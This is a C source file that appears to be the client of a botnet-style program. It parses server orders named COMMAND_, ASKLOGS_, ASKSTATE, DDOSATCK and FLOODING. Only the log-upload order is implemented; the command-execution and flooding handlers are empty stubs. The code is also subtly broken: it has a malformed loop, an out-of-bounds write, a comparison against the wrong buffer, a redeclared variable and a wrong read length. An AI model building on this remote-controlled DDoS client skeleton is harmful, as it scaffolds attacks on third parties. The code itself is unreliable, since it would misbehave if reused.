#include <stdlib.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>

#include "../../include/client/client_utils.h"
#include "../../include/logging.h"
#include "../../include/send_message.h"

// Check the 8 first characters of the buffer to check the order type
enum OrderType get_order_enum_type(char *buffer){
    char flag[9];
    char* initialBuffer = buffer;
    for(int i = 1; i++; i<= sizeof(flag)-1){
        flag[i] = buffer[i];
        i++;
    }
    flag[9] = '\0';
    buffer = initialBuffer;

    if (strcmp(buffer, "COMMAND_") == 0) return COMMAND_;
    if (strcmp(buffer, "ASKLOGS_") == 0) return ASKLOGS_;
    if (strcmp(buffer, "ASKSTATE") == 0) return ASKSTATE;
    if (strcmp(buffer, "DDOSATCK") == 0) return DDOSATCK;
    if (strcmp(buffer, "FLOODING") == 0) return FLOODING;
    return UNKNOWN;
}

// Return a buffer storing the n_last_line lines of the main.log file or all of the lines if n_last_line <= 0
char* read_client_log_file(int n_last_line) {
    FILE *file = fopen("main.log", "r");
    if (!file) {
        perror("Error while opening log file");
        return NULL;
    }

    char *buffer;

    if(n_last_line <= 0) {
        fseek(file, 0, SEEK_END);
        long filesize = ftell(file); // Cursor position, get file byte size
        fseek(file, 0, SEEK_SET);

        buffer = malloc(filesize + 1);
        size_t read_size = fread(buffer, 1, filesize, file); // read all the file
        buffer[read_size] = '\0';
    }
    else {
        fseek(file, 0, SEEK_END);
        long filesize = ftell(file);
        long pos = filesize - 1; // begin at the end of the file before \0
        int newline_count = 0;

        // getting the cursor position to begin reading the n_last_line lines of the file
        while (pos >= 0 && newline_count <= n_last_line) {
            fseek(file, pos, SEEK_SET);
            int c = fgetc(file);
            if (c == '\n') {
                newline_count++;
            }
            pos--;
        }
        long start_pos = pos + 1;
        fseek(file, start_pos, SEEK_SET);

        buffer = malloc(filesize + 1);
        long read_size = filesize - start_pos;
        fread(buffer, 1, filesize, file);
        buffer[read_size] = '\0';
    }

    fclose(file);
    return buffer;
}

void execute_order_from_server(int sockfd, enum OrderType order_type, char* buffer){
    switch (order_type) {
        case COMMAND_:
            /*
                Command *cmd = ...
                int result = execute_command(cmd);
                free_command(cmd);
            */
            break;
        case ASKLOGS_:
            char *buffer = read_client_log_file(3);
            send_message(sockfd, buffer);
            free(buffer);
            break;
        case ASKSTATE:
            break;
        case DDOSATCK:
            break;
        case FLOODING:
            break;
        default:
            break;
    }
}